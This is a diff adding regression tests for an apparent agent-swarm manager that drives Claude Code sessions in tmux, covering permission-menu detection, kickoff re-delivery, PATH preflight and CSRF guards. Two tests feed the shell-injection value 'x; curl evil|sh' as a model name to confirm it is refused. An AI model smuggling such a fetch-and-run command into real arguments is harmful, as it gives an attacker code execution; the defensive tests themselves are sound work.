@@ -10,6 +10,7 @@ const fs = require('fs');
 const os = require('os');
 const path = require('path');
 const http = require('http');
+const { spawnSync } = require('child_process');
 
 const SANDBOX = fs.mkdtempSync(path.join(os.tmpdir(), 'conductor2-test-'));
 process.env.HOME = SANDBOX;
@@ -102,6 +103,16 @@ console.log('\nswarm.plan');
   threw = false;
   try { swarm.plan({ name: 'x', purpose: 'y', permissionMode: 'yolo' }); } catch { threw = true; }
   ok(threw, 'bad permission mode → refuses');
+
+  // M1: model lands in `claude --model <x>` typed into a shell — metachars must be refused, not fired.
+  threw = false;
+  try { swarm.plan({ name: 'x', purpose: 'y', topology: 'mesh', model: 'x; curl evil|sh' }); } catch (e) { threw = /model/.test(e.message); }
+  ok(threw, 'M1: shell-injection model refused at plan time');
+
+  // M2: a nonexistent cwd used to fail mid-loop in manage.run, stranding a partial swarm.
+  threw = false;
+  try { swarm.plan({ name: 'x', purpose: 'y', topology: 'mesh', cwd: path.join(SANDBOX, 'no-such-dir') }); } catch (e) { threw = /does not exist/.test(e.message); }
+  ok(threw, 'M2: nonexistent cwd refused before anything launches');
 }
 
 // --- swarm files on disk ---------------------------------------------------------------------
@@ -186,6 +197,15 @@ console.log('\nregressions (dogfood findings)');
   ok(C('Resume from summary\nResume full session as-is') === 'resume', 'resume picker classified');
   ok(C('? for shortcuts') === 'ready' && C('loading a huge transcript…') === 'busy', 'ready footer vs unknown=busy');
 
+  // H1: a turn-time permission menu must classify as 'menu' — it used to fall through to busy (or
+  // match ready), so a board reply was typed INTO the menu as a selection. Fixture = a real
+  // Claude Code permission menu.
+  const MENU_PANE = '⏺ Bash(rm -rf node_modules)\n\nDo you want to run this command?\n  rm -rf node_modules\n\n'
+    + "❯ 1. Yes\n  2. Yes, and don't ask again for rm commands in this project\n  3. No, and tell Claude what to do differently (esc)";
+  ok(C(MENU_PANE) === 'menu', 'H1: a captured permission menu classifies as menu');
+  ok(C('Do you want to proceed?\n❯ 1. Yes\n  2. No') === 'menu', 'H1: generic proceed menu classifies as menu');
+  ok(C('Do you trust this folder?\n❯ 1. Yes, I trust') === 'trust', 'H1: trust prompt still wins over the menu pattern (both render "❯ 1. Yes")');
+
   // F1 (finishline swarm): Claude transforms EVERY non-alphanumeric cwd char to '-', not just '/'.
   // A cwd with '.', '_', or a space must still resolve — the old '/'-only transform computed a
   // directory that doesn't exist and silently lost the swarm from the cockpit.
@@ -215,9 +235,37 @@ if (!manage.hasTmux()) {
   ok(!!listed && listed.topology === 'pipeline', 'registry keeps the topology');
   const dbl = swarm.fire({ name, topology: 'pipeline', purpose: 'x', agents: 2 }, { cmd: 'sleep 1 #', kickoff: false });
   ok(!dbl.ok && /already/.test(dbl.error), 'double-fire into a live swarm refused');
+  // H2: the kickoff is persisted in the registry at fire time, so a lost one can be re-delivered.
+  const member = manage.listManaged().find((w) => w.swarm === name);
+  ok(!!member && typeof member.kickoff === 'string' && member.kickoff.includes(member.label), 'H2: fire persists each window\'s kickoff in the registry');
   const stop = swarm.stopSwarm(name);
   ok(stop.ok && stop.stopped.length === 2, 'stopSwarm kills both windows');
   ok(!swarm.listSwarms().find((s) => s.swarm === name), 'stopped swarm leaves the registry');
+
+  // D3: `claude` (or the test seam's cmd) must resolve on PATH before any window is created.
+  const noBin = swarm.fire({ name: 'v2nobin', topology: 'pipeline', purpose: 'x', agents: 2 }, { cmd: 'no-such-cli-9f2c #', kickoff: false });
+  ok(!noBin.ok && /PATH/.test(noBin.error), 'D3: fire refuses when the launch binary is not on PATH');
+  ok(!swarm.listSwarms().find((s) => s.swarm === 'v2nobin'), 'D3: preflight failure creates no windows');
+
+  // H1: a pane showing a permission menu refuses text delivery — typed text would be eaten as a
+  // menu selection. Print a real menu into a live pane and try to deliver into it.
+  const menuLabel = 'v2menu' + String(process.pid).slice(-4);
+  const menuCmd = "printf 'Do you want to run this command?\\n❯ 1. Yes\\n  2. Yes, and dont ask again\\n  3. No (esc)\\n'; sleep 30 #";
+  const mr = manage.run(menuLabel, [], SANDBOX, { cmd: menuCmd, capture: false });
+  ok(mr.ok, 'menu fixture window launched');
+  spawnSync('sleep', ['1.2']);   // let the shell render the menu
+  ok(manage.paneStage(menuLabel) === 'menu', 'H1: live pane showing a permission menu stages as menu');
+  const md = manage.deliver(menuLabel, 'hello there');
+  ok(!md.ok && md.status === 'skipped' && md.stage === 'menu', 'H1: deliver refuses text at a permission menu');
+  ok(/permission menu/.test(md.error || ''), 'H1: the refusal says approve/deny it, don\'t type into it');
+  manage.stop(menuLabel);
+  // approveMenu's no-menu guard: a plain shell pane is not a menu, so nothing is approved.
+  const plainLabel = 'v2plain' + String(process.pid).slice(-4);
+  manage.run(plainLabel, [], SANDBOX, { cmd: 'sleep 30 #', capture: false });
+  spawnSync('sleep', ['0.8']);
+  const am = manage.approveMenu(plainLabel);
+  ok(!am.ok && /no permission menu/.test(am.error), 'H1: approveMenu refuses when no menu is showing (stale click guard)');
+  manage.stop(plainLabel);
 }
 
 // --- server ----------------------------------------------------------------------------------
@@ -238,6 +286,8 @@ srv.listen(0, '127.0.0.1', async () => {
   const board = await get('/board');
   ok(board.status === 200 && board.text.includes('Board') && board.text.includes('Launch pad'), 'GET /board serves the cockpit board');
   ok(board.text.includes('isStalled') && board.text.includes('⚠ stalled?') && board.text.includes('data-nudge'), 'board ships the stalled-handoff detector + nudge (finding #5)');
+  ok(board.text.includes('data-approve') && board.text.includes('data-deny') && board.text.includes('permission menu'), 'H1: board ships approve/deny buttons for permission menus');
+  ok(board.text.includes('data-rekick') && board.text.includes('/api/rekick'), 'H2: board ships the kickoff-lost re-kickoff button');
 
   const cfg = await get('/api/config');
   const cj = JSON.parse(cfg.text);
@@ -251,6 +301,35 @@ srv.listen(0, '127.0.0.1', async () => {
 
   const badStop = await post('/api/stop-swarm', { swarm: 'zzz' }, { 'x-conductor': '1' });
   ok(badStop.status === 400 && /confirm/.test(badStop.json.error), 'stop-swarm without confirm token refused');
+
+  // M1: the injection is refused at the HTTP fire path too, before anything launches.
+  const inj = await post('/api/fire', { name: 'inj', topology: 'mesh', purpose: 'x', agents: 2, model: 'x; curl evil|sh' }, { 'x-conductor': '1' });
+  ok(inj.status === 400 && /model/.test(inj.json.error), 'M1: POST /api/fire with a shell-injection model → 400');
+
+  // H2: a registry swarm member with NO transcript (sessionId never resolved) must surface as a
+  // synthetic "kickoff lost?" card once past the 90s grace period — it writes no transcript, so
+  // without this it has no card at all and the stalled detector is blind to it.
+  if (manage.hasTmux()) {
+    const lname = 'v2lost' + String(process.pid).slice(-4);
+    const fr = swarm.fire({ name: lname, topology: 'pipeline', purpose: 'x', agents: 2 }, { cmd: 'sleep 30 #', kickoff: false });
+    ok(fr.ok, 'lost-kickoff fixture swarm fired');
+    // Age the windows past the grace period (sandboxed registry — ours to edit).
+    const reg = JSON.parse(fs.readFileSync(manage.REG_FILE, 'utf8'));
+    for (const k of Object.keys(reg.windows)) if (reg.windows[k].swarm === lname) reg.windows[k].created -= 120000;
+    fs.writeFileSync(manage.REG_FILE, JSON.stringify(reg));
+    const sess = await get('/api/sessions?minutes=60');
+    const lost = (JSON.parse(sess.text).sessions || []).filter((s) => s.lost && s.swarm === lname);
+    ok(lost.length === 2, 'H2: no-transcript swarm members render synthetic kickoff-lost cards');
+    ok(lost.every((s) => s.managed && /kickoff may be lost/.test(s.lastAction)), 'H2: synthetic card is managed + says why');
+    const w0 = fr.agents[0].window;
+    const rkNo = await post('/api/rekick', { label: w0 });
+    ok(rkNo.status === 403, 'H2: POST /api/rekick without X-Conductor header → 403 (CSRF guard)');
+    const rkBad = await post('/api/rekick', { label: 'zzz' }, { 'x-conductor': '1' });
+    ok(rkBad.status === 400 && /no live managed window/.test(rkBad.json.error), '/api/rekick refuses an unknown window');
+    const rk = await post('/api/rekick', { label: w0 }, { 'x-conductor': '1' });
+    ok(rk.status === 200 && rk.json.ok && rk.json.label === w0, '/api/rekick re-delivers the persisted kickoff');
+    swarm.stopSwarm(lname);
+  }
 
   srv.close();
   console.log(`\n${pass} passed, ${fail} failed\n`);
